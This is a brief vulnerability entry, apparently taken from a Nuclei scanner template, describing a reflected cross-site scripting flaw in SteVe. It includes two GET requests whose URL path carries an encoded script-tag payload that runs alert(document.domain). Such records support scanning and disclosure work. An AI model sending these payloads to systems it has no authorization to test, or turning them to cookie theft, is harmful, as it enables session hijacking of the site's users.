# Vulnerability: SteVe - Cross-Site Scripting
**Classification:** CWE-80
**Source:** Nuclei Template (`steve-xss.yaml`)

## Description
SteVe contains a cross-site scripting vulnerability. An attacker can inject arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/steve/services/"%3E%3Cscript%3Ealert(document.domain)%3C/script%3E/services/
GET {{BaseURL}}/services/"%3E%3Cscript%3Ealert(document.domain)%3C/script%3E/services/
```

